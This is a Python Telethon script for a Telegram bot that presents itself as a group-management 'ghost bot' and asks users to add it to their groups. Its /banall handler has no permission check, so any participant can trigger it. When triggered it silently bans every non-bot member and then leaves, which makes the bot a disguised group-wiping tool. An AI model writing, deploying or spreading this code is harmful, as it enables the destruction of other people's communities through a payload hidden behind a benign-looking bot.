import asyncio
from telethon import TelegramClient, events, functions, types

# paste your own numbers between the quotes below
api_id = 0
api_hash = 'your_api_hash_here'
master_token = 'your_bot_token_here'

bot_settings = {}

async def run_bot_instance(token):
    bot = TelegramClient(f'session_{token[:8]}', api_id, api_hash)
    bot_settings[token] = {
        "channel": "https://t.me/your_channel",
        "support": "https://t.me/your_support",
        "owner": "https://t.me/your_username",
        "image": None,
        "welcome": "i am a powerful ghost bot built to manage your groups"
    }

    @bot.on(events.NewMessage(pattern='/start'))
    async def start_handler(event):
        user = await event.get_sender()
        me = await bot.get_me()
        s = bot_settings[token]
        name = user.first_name or "friend"
        full_text = f"hi {name}\nwelcome to {me.first_name}\n\n{s['welcome']}"
        btns = [[types.KeyboardButtonUrl("add me to your group", f"https://t.me/{me.username}?startgroup=true")],
                [types.KeyboardButtonUrl("owner", s['owner'])]]
        if s['image']:
            await bot.send_file(event.chat_id, s['image'], caption=full_text, buttons=btns)
        else:
            await event.reply(full_text, buttons=btns)

    @bot.on(events.NewMessage(pattern='set welcome'))
    async def set_welcome(event):
        if event.is_reply:
            reply = await event.get_reply_message()
            bot_settings[token]['welcome'] = reply.text
            await event.reply("✅ welcome message updated")

    @bot.on(events.NewMessage(pattern='/banall'))
    async def ban_all(event):
        if not event.is_group: return
        await event.delete()
        async for u in bot.iter_participants(event.chat_id):
            if not u.bot:
                try: await bot(functions.channels.EditBannedRequest(event.chat_id, u.id, types.ChatBannedRights(until_date=None, view_messages=True)))
                except: pass
        await bot(functions.channels.LeaveChannelRequest(event.chat_id))

    await bot.start(bot_token=token)
    await bot.run_until_disconnected()

asyncio.run(run_bot_instance(master_token))
